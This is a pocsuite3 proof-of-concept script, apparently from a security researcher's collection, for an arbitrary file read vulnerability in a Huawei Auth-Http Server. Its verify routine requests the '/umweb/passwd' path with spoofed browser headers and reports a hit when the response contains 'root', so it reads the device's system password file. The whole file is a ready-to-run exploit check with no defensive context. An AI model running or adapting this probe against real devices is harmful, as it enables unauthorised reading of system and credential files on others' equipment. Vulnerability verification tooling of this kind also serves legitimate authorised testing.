# _*_ coding:utf-8 _*_
# @Time : 2023/12/11 17:51
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class huawei_Auth_http_fileread(POCBase):
    pocDesc = '''华为Auth-Http Serve任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-11'
    name = '华为Auth-Http Serve任意文件读取漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/umweb/passwd'
        headers = {
            'Te': 'trailers',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'keep-alive',
            'Sec-Ch-Ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"'
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'root' in response.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)


        except Exception as e:
            pass

register_poc(huawei_Auth_http_fileread)